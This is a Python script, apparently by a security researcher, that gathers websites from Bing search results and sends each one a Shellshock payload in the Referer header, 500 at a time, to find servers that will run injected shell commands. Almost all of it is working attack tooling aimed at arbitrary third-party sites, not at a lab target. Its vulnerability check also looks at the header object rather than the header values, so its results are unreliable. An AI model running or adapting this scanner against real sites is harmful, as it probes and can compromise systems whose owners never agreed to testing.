#!/usr/bin/env python

#This must be one of the first imports or else we get threading error on completion
from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool
from gevent import joinall

import urllib
import urllib2
import argparse
import sys
import json

__author__ = 'Dan McInerney'
__site__ = 'danmcinerney.org'
__twitter__ = '@danhmcinerney'

VULN_FOUND = None

def parse_args():
   ''' Create the arguments '''
   parser = argparse.ArgumentParser()
   parser.add_argument("-s", "--search", help="Search terms")
   parser.add_argument("-l", "--limit", default="10", help="Limit number of results")
   parser.add_argument("-k", "--key", help="Your Bing API key found at https://datamarket.azure.com/account")
   return parser.parse_args()

def bing_search(query, limit, key, **kwargs):
    ''' Make the search '''
    username = ''
    baseURL = 'https://api.datamarket.azure.com/Bing/SearchWeb/'
    limit = str(limit)
    query = urllib.quote(query)
    user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)'
    credentials = (':%s' % key).encode('base64')[:-1]
    auth = 'Basic %s' % credentials
    url = baseURL+'Web?Query=%27'+query+'%27&$top='+limit+'&$format=json'
    password_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
    password_mgr.add_password(None, url, username, key)
    handler = urllib2.HTTPBasicAuthHandler(password_mgr)
    opener = urllib2.build_opener(handler)
    urllib2.install_opener(opener)
    readURL = urllib2.urlopen(url).read()
    return readURL

def action(result):
    ''' Perform this action on each result '''
    global VULN_FOUND
    exploit = "() { :;}; echo 'Shellshocked: Vulnerable'"
    ua = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0'
    url = result['Url']

    req = urllib2.Request(url)
    req.add_header('User-Agent', ua)
    req.add_header('Referer', exploit)
    try:
        r = urllib2.urlopen(req)
    except Exception:
        return
    resp_headers = r.info()
    if 'shellshocked' in r.info():
        VULN_FOUND = True
        print '[!] SHELLSHOCK VULNERABLE:', url

def result_concurrency(results):
    ''' Do some current actions to the results '''
    in_parallel = 500 
    pool = Pool(in_parallel)
    jobs = [pool.spawn(action, result) for result in results]
    return joinall(jobs)

def main():
    args = parse_args()
    if not args.search:
        sys.exit('[!] Specify a search term, eg, ./search-bing.py -s "search for this"')
    if not args.key:
        sys.exit('[!] Specify a Bing API key or get one here: https://datamarket.azure.com/dataset/bing/search')
    key = args.key
    query = args.search
    limit = int(args.limit)
    response = bing_search(query, limit, key)
    results = json.loads(response)['d']['results']
    result_concurrency(results)
    if not VULN_FOUND:
        print 'No vulnerable sites found'

if __name__ == "__main__":
    main()
